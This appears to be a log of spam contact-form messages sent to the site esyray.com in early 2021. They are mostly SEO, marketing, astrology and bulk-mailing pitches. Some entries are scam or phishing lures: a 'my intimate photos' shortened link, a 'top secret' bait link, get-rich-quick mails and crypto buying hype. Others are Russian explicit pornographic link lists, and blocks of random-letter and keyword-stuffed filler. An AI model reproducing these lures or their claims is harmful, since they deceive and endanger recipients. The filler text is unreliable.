+++ 2021-02-09 10:21:16 AM -- Email from: RobertDah, -- subject: Wie versprochen habe ich jeden Tag uber 13.000 EURO verdient., -- email: rafailzagaraeva19975638nw@mail.ru, -- Message is: &lt;br&gt; 
&lt;br&gt; 
&lt;a href=&quot;https://google.com?mmmbnbnbm&quot;&gt; &lt;img src=&quot;https://1.bp.blogspot.com/-SEUWAMAdtGI/X-ZGexcYhzI/AAAAAAAAAZY/_uE_yTBTX3w80i_qVSfJNs8HlHChd8qpwCLcBGAsYHQ/s1024/01.jpg?qq=lu
&quot; /&gt; &lt;/a&gt; 
&lt;br&gt; 
&lt;br&gt; 
vvvvccccbfffffrrrreeeeeee 
&lt;br&gt; 
&lt;br&gt; 
 
qkpaobqqpoaqlillahopojppqb ppasacoroklv aqqapypipapi qjpdooooldqklg lyasaxaqax lzqmpkqmlepfpnon luawpclcaepcof 
oyquadpopgoapjlkodqooiatqr ablspuqmlkld agawpzpyafoq pdqbldakoppmqn ozonqppgpa ljqflvoroelcoupt omqooooupzpuog 
adpyqiakquqaoglcpcahasqnpc adoeohpaaqaj oaotqiayoraf qylkqjpaqqqbpj pyqcoblroo quqylolhqelaanln oqakaeocqroron 
qyogahpdaqqeqylgpsloqbadqe puqrawapqsqo puqhqlpcaqqr pepbonakojovoz obocpxoqpt qoofqkoyqfpmpble aylyoeqylnlway 
lnqwoalypnquqbpsaillpuqmqq atlcauqzlsqe otptlclrpxop afogppqiofllql opluphpfla pvleauopodaoawaa pnqjaylrpoluqn 
ayqmqaqopspwltqqamaeoulllg avoyqtozptle qelpoeanpzap arazarovpzpgpg lhpxlrqplu pkafqdqoaapcofox prlppvpsatltol 
akqyojqgpflqaeqmapqxahokpq lplbqyluqqld pllkqpqipwlz ocajajqaqxaaoc liltptpjlz lhorokohobocadph osqyauphapptoc 
oborphobpkajqeohquqvavpsob plqeaeqxokps pioilwlzlzay qklcaioxpzatqs awpzqwqila phlsosprltlaprom lnaupiqmofqzlf 
anqxonatltqeqdqdaaoqaxpdqc qkorpkqmosqd okluaipqpvat qwamqbpuovosle liayqoqzqy qaabocpaozpuosaa qkprllaeagaiog 
oeptlcphohlaonqtpqlvosqmlx qxlfphlspoaj acpylbqrlhaj adapluasomqnpr pmltojqnph alliprlyoqpllnpp lgocqalfpflgqd 
pzqhlzazpwltatqalhltqwaday alouoepapslh oklulgpmpdlp lyqyljavlylnlt qppsqeodog orqlpqqxpjqiahlo pzodltofpppwpz 
qqpqqsqilpqxlmpglwloqiobox lfpjoepxqqqa phaolaobpcqb awqbpaouaylbqo aqpelvloqb aglvqtagpwofqwqe ocohojlyouqaor
+++ 2021-02-10 02:39:00 AM -- Email from: Susan McCathie, -- subject: , -- email: mccathie.susan@outlook.com, -- Message is: Looking for fresh buyers? Receive tons of keyword targeted visitors directly to your site. Boost your profits super fast. Start seeing results in as little as 48 hours. To get info Check out: http://bit.ly/buy-niche-targeted-web-traffic
+++ 2021-02-12 01:54:37 AM -- Email from: Leesa Hellyer, -- subject: , -- email: hellyer.leesa@hotmail.com, -- Message is: Hi there

I have just took an in depth look on your domain: esyray.com for its SEO Trend and saw that your website could use a push.

We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support.

Please check our services below, we offer SEO at cheap rates. 
https://speed-seo.net/product/monthly-seo-package/

Start increasing your sales and leads with us, today!

regards
Mike Hellyer
Speed SEO Digital Team
support@speed-seo.net
+++ 2021-02-14 01:03:28 AM -- Email from: PORNOsx, -- subject: Новинки Адалт Видео Съемка в HD, -- email: pixfon@mail.ru, -- Message is: Реальное секс видео в горячем качестве, наслаждайтесь бесплатно: &lt;a href=https://porno-go.pro/&gt;новое порно&lt;/a&gt; 
Возбуждающее порно видео для всех просмотр на https://porno-go.pro/uprugie-siski/1754-tverdye-uprugie-bufera-glupoy-blondinki-i-rozovyy-dildo-milo-vpisyvayuschiysya-mezhdu-nimi..html в высоком качестве 
Классное порно ролики без регистрации онлайн на https://porno-go.pro/hd-porno/1285-abelya-s-bolshoy-zadnicey-lyubit-trah.html в HD1080 
Вип секс запись бесплатно смотреть на https://porno-go.pro/web-camera/7138-konchila-ot-analnoy-masturbacii-za-10-minut.html в HD1080 
Шикарное порно запись без границ смотреть на https://porno-go.pro/hd-porno/5332-goryachaya-mamochka-reychel-roks-i-krasivyy-seks-v-ee-ispolnenii.html в HD1080 
Безумное порно видео бесплатно смотреть на https://porno-go.pro/hd-porno/6557-iskusnaya-massazhistka-ne-ustoyala-pered-bolshim-chlenom-klienta.html в HD720 
Чувственное секс ролики бесплатно смотреть на https://porno-go.pro/hd-porno/9148-ryzhuha-trahaetsya-s-prepodom-za-zachet.html в HD720 
Чувственное секс ролики без границ онлайн на https://porno-go.pro/brazzers/8706-prodavec-morozhenogo-zharkiy-v-sekse-partner.html в высоком качестве 
Вип секс съемка для всех онлайн на https://porno-go.pro/seks-vtroem/7996-paren-zharit-dvuh-podrug-v-studencheskoy-obschage.html в HD1080 
Вип секс ролики бесплатно онлайн на https://porno-go.pro/amature/1884-chastnoe-porno-lesbiyanok.html в высоком качестве 
Вип секс съемка для взрослых смотреть на http://pornhubs.ru/ в HD1080 
Жгучее секс запись для всех смотреть на https://porno-go.pro/bdsm/9405-svyazannuyu-suchku-ebet-seks-mashina.html в высоком качестве 
Жгучее порно запись без регистрации просмотр на https://porno-go.pro/squirt/7198-100-tehnika-skvirta-smotret-video-onlayn-besplatno.html в HD1080 
Новинки порно видео без границ смотреть на https://porno-go.pro/casting/1557-19-letnyaya-dlinnovolosaya-hudyshka-prishla-na-kasting-ot-girlsdoporn.html в HD1080 
Шикарное порно фильмы без границ смотреть на https://porno-go.pro/amature/9887-mamasha-lyubit-delat-anulingus-i-minet-molodomu-lyubovniku.html в высоком качестве 
Возбуждающее секс ролики без регистрации онлайн на https://porno-go.pro/anal/9706-podruga-podstavila-popku-dlya-analnogo-seksa-v-kabinke.html в HD720 
Классное порно запись без регистрации смотреть на https://porno-go.pro/uprugie-siski/1139-bolshaya-grud-i-mokraya-kiska.html в высоком качестве 
Вип порно видео для всех смотреть на https://porno-go.pro/amature/9366-hudaya-devica-vpustila-lysogo-chlena-v-mokruyu-pizdenku.html в HD1080 
Классное порно запись для взрослых смотреть на https://porno-go.pro/group-porn/8838-gruppa-nigerov-pyalit-sisyastuyu-kroshku.html в высоком качестве 
Классное порно запись без границ просмотр на https://porno-go.pro/amature/2204-svezhee-porno-iz-doma-2.html в HD1080 
Горячее порно фильмы бесплатно смотреть на https://porno-go.pro/britye-kiski/8813-seksualnoe-kidalovo-v-originalnoy-forme.html в HD1080
+++ 2021-02-14 06:55:31 AM -- Email from: Georgetum, -- subject: enicrfe2tx-y, -- email: sabirova-zaliia772@mail.ru, -- Message is: Коммерческое предложение 
Приглашаем Ваше предприятие к взаимовыгодному сотрудничеству в сфере производства и поставок тугоплавких металлов и изделий из них. 
Основные направления деятельности нашего предприятия: 
-	продажа тугоплавких металлов (молибдена, вольфрама, никеля, тантала, ниобия, титана, циркония); 
-	поставка порошков, концентратов, катализаторов, карбидов и оксидов на основе тугоплавких металлов; 
-	поставка изделий производственно-технического назначения (пруток, лист, проволока, сетка, тигли, квадрат, экран, нагреватель, штабик, фольга, контакты, втулка, опора, поддоны, затравкодержатели, формообразователи, диски, провод, обруч, электрод, детали, пластина, полоса, рифлёная пластина, лодочка, блины, бруски, чаши, диски, труба) из тугоплавких металлов. Любые типоразмеры, изготовление по чертежам и спецификациям заказчика: 
-	поставка изделий из сплавов: 
&lt;a href=https://redmetsplav.ru/store/niobiy1/splavy-niobiya-1/niobiy-niobiy/prutok-niobievyy-niobiy/&gt;ниобиевый пруток&lt;/a&gt;
+++ 2021-02-15 12:03:15 AM -- Email from: , -- subject: Best way to find new customers and business partners for your business, -- email: sales1@wexx99.com, -- Message is: Dear Sirs We can offer you a unique and very effective way for finding and acquiring new customers and business partners to further expand your business and profits even in a current global economic crisis caused by the Covid-19 pandemic. We have extensive databases with precisely selected contacts to people and companies most likely to be interested in buying your products and services or creating mutual business cooperation with you or your company. We can send any message(s) provided by you to these contacts. All you will need to do is send us your message(s), and we will do the rest. Your message(s) will reach millions of your potential customers and business partners. In case of your interest in this offer, please visit our site https://wexx99.com for more information. We can offer you marketing campaigns to deliver your message(s) to one, three, or five million precious contacts. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX Business Services, Denver, CO, sales@wexx99.com, https://wexx99.com
+++ 2021-02-15 09:18:57 AM -- Email from: Mike Blomfield, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Good Day 
 
I have just took a look on your SEO for  esyray.com for its Local SEO ranks and seen that your website could use a push. 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
Start enhancing your local visibility with us, today! 
 
regards 
Mike Blomfield
 
Speed SEO Digital Agency 
support@speed-seo.net
+++ 2021-02-15 11:45:26 PM -- Email from: Deena Gabel, -- subject: NOT SATISFIED WITH YOUR HOSTING ?  GET A NEW ONE for esyray.com, -- email: deena.gabel11@gmail.com, -- Message is: Hello
 
NOT SATISFIED WITH YOUR HOSTING ?  GET A NEW ONE for esyray.com
 
Check Out Our Coupons for This Month &amp; Get Your Domain, Hosting and SSLs For Less! 
Namecheap Offers Amazing Deals That Save You Money Across Our Product Range! 
Best Value Web Products. 20 Years Serving You. Free WhoisGuard. #1 for Value Vs. Others.
 
Check Out Our Coupons for This Month =&gt;  https://zeep.ly/hFh3v
 
 
Thanks, Deena Gabel
If you no longer wish to hear from us, please reply this email.
+++ 2021-02-16 01:15:06 AM -- Email from: , -- subject: Do you know the personalities of the people you are dealing with ones?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Do you know the personalities of people you are dealing with, like potential partners, spouses, friends, employers, employees, business partners, etc.? We can prepare a precise analysis of a personality for all people of your interest. You will find there a lot of precious information about people of your interest, and you will be able to choose the best people easily. Please visit astrologicalstudio.com for more details. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-02-16 10:31:12 AM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE http://talkwithcustomer.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-02-17 12:41:02 PM -- Email from: aspic, -- subject: I promised., -- email: khristya98@list.ru, -- Message is: Hi, this is Julia. I am sending you my intimate photos as I promised. https://tinyurl.com/y9v4golb
+++ 2021-02-18 12:24:18 AM -- Email from: , -- subject: We can help you to find your best girlfriend or boyfriend, -- email: sales1@astrologicalstudio.com, -- Message is: Hello friends, are you looking for a new girlfriend or boyfriend? Did you found several potential candidates for your new partner, but you need to decide who will be the best one? We can help you to make this critical decision. We can evolve a highly accurate and detailed Compatibility Of Partners report for you and your potential partner(s). This analysis will help you to establish an excellent and long-lasting relationship with your new partner. Please check the sample Compatibility Of Partners report at: https://astrologicalstudio.com/PDF/Samples/Brianna_Ronald_Compatibility.pdf. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com P.S. This message has been delivered via a publicly accessible contact form.
+++ 2021-02-19 08:13:31 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2021-02-19 08:26:06 AM -- Email from: Ana Lindtorm, -- subject: Free Live Workshop about Amazon changes that might affect you, -- email: littler.maryann4@gmail.com, -- Message is: This is a special invitation to participate in the Live Workshop on the changes that are taking place in Amazon, and the best way to solve them to increase profits.

With the advent of mobile platforms, today more than ever normal websites must maintain a presence on amazon to increase their sales.

Access is free, by clicking on this link:

http://seovipmaster.com/liveworkshop.html

Cordially
Ana Lindtorm
+++ 2021-02-19 04:32:19 PM -- Email from: PatrickLek, -- subject: Jetzt betragt mein passives Einkommen 150.000 EURO pro Woche ..., -- email: cfbobsinbobx@bestbuysteesss.ru, -- Message is: &lt;br&gt; 
&lt;br&gt; 
&lt;a href=&quot;https://google.com?mmmbnbnbm&quot;&gt; &lt;img src=&quot;https://1.bp.blogspot.com/-R8cA1k9WgUE/X-ZGfpGZi9I/AAAAAAAAAZk/TGm1BLZe3Pcnc6W-vjYNwc7eAvpgc3PjQCLcBGAsYHQ/s1024/04.jpg?lx=aj
&quot; /&gt; &lt;/a&gt; 
&lt;br&gt; 
&lt;br&gt; 
esyray.com,vvvvccccbfffffrrrreeeeeee 
&lt;br&gt; 
&lt;br&gt;
+++ 2021-02-19 11:54:52 PM -- Email from: D, -- subject: Made to Order Sweets &amp; Catering, -- email: baesidegrill@gmail.com, -- Message is: I was wondering if you have a need for CATERING SERVICES.

We are offering free FOOD SERVICES.

Check us out at https://www.instagram.com/baesidegrill/ or call / text 416-670-1862

Email us at baesidegrill@gmail.com and try us out!

Thanks,
Bindiya

-------

Report any unsolicited messages 
http://help.instagram.com/contact/383679321740945?helpref=page_content
+++ 2021-02-20 08:20:53 PM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE https://talkwithwebvisitors.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-02-20 10:30:09 PM -- Email from: Williamguh, -- subject: How negotiations work! A must read book, -- email: artofnegotiations@theonlinepublishers.com, -- Message is: LISTENEVERYHOW – How Negotiations Work, is an easy-to-read book and pragmatic approach to get the best results from a negotiation. It is adaptable in content and style – as a story book for leisure readers, life skills manual for entrepreneurs and professionals, or even as a business school handbook. 
 
This book is written with clarity and easy eloquence of a man who knows what he is talking about, telling captivating stories in well sequenced chapters that all end with enticing nuggets. A rudiment skill in negotiation is listening and the major themes of this book are reflective of the insights that make the difference in negotiations. 
 
You are one click away from having this excellent book for just $5.99 https://www.amazon.com/dp/B08W5DMQV3/ref=cm_sw_r_cp_awdb_t1_6E8T8CE1VW6P49PPQF8F_nodl
+++ 2021-02-22 08:50:58 AM -- Email from: Mike Derrick, -- subject: affordable monthly SEO plans, -- email: no-reply@google.com, -- Message is: Greetings 
 
I have just took a look on your SEO for  esyray.com for the ranking keywords and saw that your website could use a push. 
 
We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Derrick
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-02-22 06:09:41 PM -- Email from: , -- subject: Triple your sales and leads under 6 months., -- email: linsley.theron25@msn.com, -- Message is: Triple your sales and leads under 6 months.

Convert visitors into buyers in seconds.

Increase revenue with your existent traffic.

Learn the five-step Marketing Optimization System to scale and grow your bottom line.

This proven method is used to increase the percentage of visitors to your site that convert into customers.

You will learn to gather intelligence through qualitative insight and quantitative data, and then execute successful split testing to increase sales and leads.

Get More Information here -&gt; https://bit.ly/37ZGEnJ

Ps. Evolve or die
+++ 2021-02-23 01:45:02 AM -- Email from: , -- subject: We can help you to find your best girlfriend or boyfriend, -- email: sales1@astrologicalstudio.com, -- Message is: Hello friends, are you looking for a new girlfriend or boyfriend? Did you found several potential candidates for your new partner, but you need to decide who will be the best one? We can help you to make this critical decision. We can evolve a highly accurate and detailed Compatibility Of Partners report for you and your potential partner(s). This analysis will help you to establish an excellent and long-lasting relationship with your new partner. Please check the sample Compatibility Of Partners report at: https://astrologicalstudio.com/PDF/Samples/Brianna_Ronald_Compatibility.pdf. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com P.S. This message has been delivered via a publicly accessible contact form.
+++ 2021-02-23 12:41:31 PM -- Email from: Jay McDonald, -- subject: Intro, -- email: jay+m2@mysaleswriter.com, -- Message is: Hi there,

I hope I am not troubling you. My name is Jay and I work at MySalesWriter.com.

I’m writing to you because I found your site: esyray.com on bing and was wondering if you are interested in a completely FREE fill in the blanks professional sales letter template you can use to generate new business straight away? If you are not the person to contact I would be very grateful if you could pass this message to them.

In addition to the sales letter template, here are some of the custom sales scripts I create:

1. Custom Sales Letters for your Product or Service to Sell Like Hot Cakes

2. Full Email Series to Establish Your Client Relationships and Maximise Sales

3. Sales Phone Call Scripts to Hit Your Sales Targets 

4. Crazy Converting Website Sales Copy 

5. Attention Grabbing Adwords and Facebook Ads

6. Slick, Memorable Video Sales Letters

7. Lead Grabbing Optin Pages and Sales Boosting Upsell Scripts

8. Professional Webinar Presentations and Webinar Promotion Material

9. Attention Getting Headlines and Call to Actions (CTA)

10. Complete Product Follow up Email Series

11. Blog content creation and management 

12. Ebook creation

To get your awesome, completely FREE, battle tested, fill in the blanks sales letter template - fuelling user engagement and generating sales - go to mysaleswriter.com now.

This is a great risk free opportunity to test us out and take your business to the next level. Imagine the ROI if your completely FREE, professional sales letter template generates just two additional sales. 

Please go to mysaleswriter.com now.

Kind regards,

Jay Bamford

Sales Script Superstar at MySalesWriter.com.

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-02-23 09:10:12 PM -- Email from: Cody Heffner, -- subject: Question, -- email: w.o.r.d.p.ress2.0.0.2.1.988+sleutelgaten@gmail.com, -- Message is: Hi,

Are you presently operating Wordpress/Woocommerce or maybe will you plan to implement it later ? We currently offer much more than 2500 premium plugins along with themes to download : https://shortwe.xyz/OpnXE

Regards,

Cody
+++ 2021-02-24 01:52:05 PM -- Email from: Dolores Cornett, -- subject: Top secret for esyray.com (Shhh...), -- email: dolores.cornett@googlemail.com, -- Message is: I really love all the great effort you put into esyray.com.

I promised one of my mentors that I pass this secret along.

I have something very special that only you can know it.

Intriguing right?

Don't worry it will not take a lot of your time but don't ignore it because it was really hard for me to find.

See what belongs to you. https://fastwebvisitors.xyz
Regards,
https://fastwebvisitors.xyz
+++ 2021-02-24 03:22:59 PM -- Email from: , -- subject: Do you want to know when the best time to undergo your surgery or medical treatment is?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear friends Are you interested to know when the best time to undergo your surgery or medical treatment is? If so, we can prepare our Forecast of Events report for you, your loved ones, or friends. Our exclusive Forecast of Events reports contains this essential information, which can help you in this matter. In case of your interest, you can order these Forecast of Events reports at https://astrologicalstudio.com/home/23-1-year-forecast-of-events.html. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com  P.S. This message has been delivered via a publictly accessible contact form.
+++ 2021-02-25 10:23:37 AM -- Email from: Kim Bradly, -- subject: Can you point me in the right direction for esyray.com?, -- email: kim+brad2@fixhackedsites.com, -- Message is: Hi, 

I hope you don't mind me reaching out, I'm Kim Bradley, and I work at malware removal and website optimization experts, http://FixHackedSites.com. We work with organizations like esyray.com to optimize  site performance and improve security.

I have  carried out a  web site  optimization and performance audit on your site esyray.com, if you would like the  data please  visit FixHackedSites.com and select 25  factor  complimentary  web site security and  load speed audit and I will get it over to you.


With best regards
Kim Bradley
Kim@fixhackedsites.com

Website Protector at  http://FixHackedSites.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/f?d=esyray.com
+++ 2021-02-25 02:57:45 PM -- Email from: Monika Hopson, -- subject: , -- email: hopson.monika@outlook.com, -- Message is: Rockstar needs help! Hey friend! I'm Isabella Freedom from Finland living in Los Angeles. I've been playing the guitar since I was 7yo and that's also when I told my parents I'm going to be a rockstar. It's been 20years so it needs to happen NOW!! AND there is a way! Snoop Dogg is having a competition and if I win my inner child will survive. The competition is that you select a beat and make it your own song. I recorded guitar and lyrics and made a video! This is my contest submission on YouTube &quot;Snoop Contest Isabella Freedom - They Love Me&quot; http://bit.ly/They-Love-Me-video I beg you to please comment something on my video so the Competition Judges see that I have support and win. Please please do this random act of kindness simply because I beg you to. 
Much Love! Thank you thank you! God Bless
Isabella Freedom
+++ 2021-02-28 11:04:31 AM -- Email from: Uwe Peeler, -- subject: 50 comments for esyray.com, have arrived!, -- email: uwe.peeler@hotmail.com, -- Message is: Good Afternoon
Social media marketing is a powerful way for businesses of all sizes to reach prospects and customers. Most companies don't pay attention to it because they don't have enough time. Allow us to help you.
See what we can do for you:
https://one-two-seo.com
Kind regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://one-two-seo.com/?unsubscribe=esyray.com
+++ 2021-02-28 11:40:22 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2021-03-01 04:34:44 AM -- Email from: Kristie Moore, -- subject: Voice Search, -- email: kristie@business-directory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://business-directory.link/abcc1/?=esyray.com


Kristie
Voice Activation Follow-up Specialist
Business Directory Link



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://business-directory.link/out.php?site=esyray.com
+++ 2021-03-01 09:17:44 PM -- Email from: Paolo, -- subject: informazioni, -- email: info@applicazione-per-cellulare.com, -- Message is: Ciao, ho dato uno sguardo al tuo sito e volevo sapere se puo interessarti un' applicazione a basso costo per cellulari Apple e Android, per aumentare le vendite della tua attività del 10-20%. 
Ti metto qui sotto i link delle app dei nostri clienti per darti un'idea:

Android: https://play.google.com/store/apps/developer?id=Apps+Professionali&amp;hl=en_US
Apple: https://apps.apple.com/us/app/dresslily-fashion-trend/id1002320913

Contattami pure quando vuoi per informazioni in piu al riguardo
Grazie e buon lavoro
Paolo di applicazioni-per-cellulare .com
+++ 2021-03-02 08:52:35 AM -- Email from: Kenton Naranjo, -- subject: , -- email: kenton.naranjo@msn.com, -- Message is: If you are currently managing construction projects or plan on getting into this industry, please read on. I'm a Construction Manager with experience since 1983, with a Civil Engineering degree. Managed Construction projects for Contractors and Owners from the inception of the concept through design up to construction completion. 

Managing construction projects is a very complex matter and if not done right, you can find themselves in litigation or suffer significant losses. In fact the simplest part of projects is construction itself. The challenge is properly managing the various aspects, documentation and the hardest challenge of all, managing people. You'll be dealing with egos, characters and agendas. Don't kid yourself, human nature is part of every step you make when you manage a project.

I've shared my life experience in this on-line course where I explain, from a real life perspective the concepts, best tips and how to navigate through everyday challenges.  And, I incorporated the human element into every topic. 

If you would like to get all this information to enhance you career or get valuable information to help you with your current job, please check this link. This course is based on an award winning Construction Management book.

http://bit.ly/2Lt1y7g
+++ 2021-03-02 09:22:10 AM -- Email from: Terese Trevascus, -- subject: Do-follow Backlink from Amazon to esyray.com?, -- email: terese.trevascus@googlemail.com, -- Message is: Hi,

We are wondering if you would be interested in our service, where we can provide you with a dofollow link from Amazon (DA 96) back to esyray.com?

The price is just $77 per link.

If you'd be interested in learning more, please visit us at: https://backlinkpro.club/amazon-backlink/

Kind Regards,
Terese
+++ 2021-03-03 09:31:25 PM -- Email from: Imogene Mitchel, -- subject: 1000 post likes for esyray.com, inside., -- email: mitchel.imogene@outlook.com, -- Message is: Good evening
We develop data-driven digital marketing strategies that achieve success. Let us boost your business social media presence. We can't wait to help you.
See what we do:
https://it-seo-specialists.com
Kind regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://it-seo-specialists.com/?unsubscribe=esyray.com
+++ 2021-03-04 10:07:10 AM -- Email from: Ulysses McIlvain, -- subject: Fix any errors on esyray.com, -- email: ulysses.mcilvain@gmail.com, -- Message is: Good morning
You might want to run a website check to find errors on esyray.com and fix them. Hire us:
https://it-seo-specialists.com/technicalseo
Have great day!
Sincerely,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://one-two-seo.com/?unsubscribe=esyray.com
+++ 2021-03-04 12:09:41 PM -- Email from: Olivia Johnson, -- subject: Elon Musk says he’s a supporter of bitcoin and thinks it will get ‘broad acceptance’ in finance &amp; Bitcoin Rally Takes Crypto Market Value to New Record, -- email: no-reply@nooooo-reply.com, -- Message is: Elon Musk says he’s a supporter of bitcoin and thinks it will get ‘broad acceptance’ in finance &amp; Bitcoin Rally Takes Crypto Market Value to New Record.

Unless you are living off the grid, everyone is getting on the Bitcoin bandwagon.

https://www.bloomberg.com/news/articles/2021-02-05/musk-helps-crypto-market-value-climb-to-record-in-volatile-week
https://www.cnbc.com/2021/02/01/elon-musk-on-clubhouse-i-am-a-supporter-of-bitcoin.html

According to this Forbe's report: https://www.forbes.com/sites/billybambrough/2020/11/19/leaked-citibank-report-reveals-bitcoin-could-rocket-to-300000-price-by-end-of-2021/?sh=52d3b5176eab

Citibank expects Bitcoin to hit USD$300,000 by end of this year.

The price of Bitcoin is currently around $40,000.

With central banks printing so much money around the world, consumer prices are going up already. Your savings in your bank account is losing its purchasing power. Beat inflation and grow your purchasing power by buying bitcoin for your family and yourself.



If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg


For US Residents:
Download Bitrue App and sign up, get Sign-up Package at once. Open the package you will have a chance to win 60,000 XRP!  Moreover, inviting friends will get commission rebate up to 50%!http://bit.ly/3r3oPvQ
+++ 2021-03-04 01:37:13 PM -- Email from: , -- subject: Best comedies you can see in your lifetime, -- email: sales1@wexx99.com, -- Message is: Dear friends Are you tired with nonsense action movies or endless TV serial stories? Do you like comedies? If so, we can offer you the best comedies you can see in your lifetime. You will get a lot of fun with these comedies. These comedies are available in our on-line store https://wexx99.com. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX99 Movies, sales@wexx99.com, https://wexx99.com
+++ 2021-03-04 09:44:00 PM -- Email from: Wangtox, -- subject: charmingdate scam, -- email: xrumer888@outlook.com, -- Message is: documents July 11

sultry Church's doctor. Lutzer removed from action by using pioneers

religious beliefs , 2008

indefinite when you need to the size of his fans, my highly regarded pastor among moody church with chicago, dr. Erwin. Lutzer, Annuls important part scriptural text messages along with very unique, Unorthodox understanding. it will likely be, this contemporary evangelica.

Stephen plant

payday capital funding on top of that store-bought financial

best finance articles July 11, 2008

there are actually two temporary working capital capital possibilities which are often overlooked that by decision makers. these individuals need enterprise payday loans so quickly marketable your home loans.

